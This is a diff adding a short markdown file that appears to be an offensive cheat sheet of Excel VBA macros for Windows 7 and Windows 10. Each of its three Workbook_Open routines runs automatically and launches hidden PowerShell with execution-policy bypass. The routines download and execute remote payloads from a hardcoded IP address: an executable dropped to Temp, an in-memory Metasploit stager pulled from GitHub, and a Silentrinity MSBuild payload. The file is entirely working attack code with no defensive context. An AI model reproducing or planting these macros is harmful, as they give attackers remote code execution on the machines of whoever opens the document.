@@ -1,0 +1,20 @@
+# VBA Scripts
+## Windows 7 and <
+### Obfuscated payload
+
+Private Sub Workbook_Open()
+	Call Shell("cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass ""IEX(New-Object System.Net.WebClient).DownloadFile('http:// 192.168.81.206:8000/payload.exe',\""C:\Windows\Temp\payload.exe\"")"";Start-Process \""C:\Windows\Temp\payload.exe\""", vbHide)
+End Sub
+
+
+### All in memory
+
+Private Sub Workbook_Open()
+	Call Shell("cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass ""IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jaredhaight/Invoke-MetasploitPayload/master/Invoke-MetasploitPayload.ps1')"";Invoke-MetasploitPayload \""http://192.168.81.206:8080/lGbGFdPk\""", vbHide)
+End Sub
+
+## Windows 10 and Silentrinity
+
+Private Sub Workbook_Open()
+    Call Shell("cmd.exe /c powershell -NoP -NonI -W Hidden -Exec Bypass ""IEX (New-Object System.Net.WebClient).DownloadFile('http://192.168.10.128:8000/msbuild.xml',\""C:\Windows\Temp\msbuild.exe\"")""; Start-Process \""C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe\"" \""C:\Windows\Temp\msbuild.exe\""", vbHide)
+End Sub
